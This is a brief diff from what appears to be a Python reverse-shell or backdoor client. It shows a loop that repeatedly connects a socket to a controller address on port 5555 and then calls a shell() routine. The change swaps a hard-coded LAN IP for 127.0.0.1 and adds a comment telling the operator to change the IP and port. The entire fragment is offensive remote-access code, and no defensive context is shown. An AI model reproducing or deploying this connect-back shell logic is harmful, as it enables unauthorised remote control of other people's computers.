@@ -21,7 +21,7 @@ def connection():
         while True:
                 time.sleep(10)
                 try:
-                        s.connect(('192.168.88.130',5555))
+                        s.connect(('127.0.0.1',5555)) # Change IP and PORT
                         shell()
                         s.close()
                         break
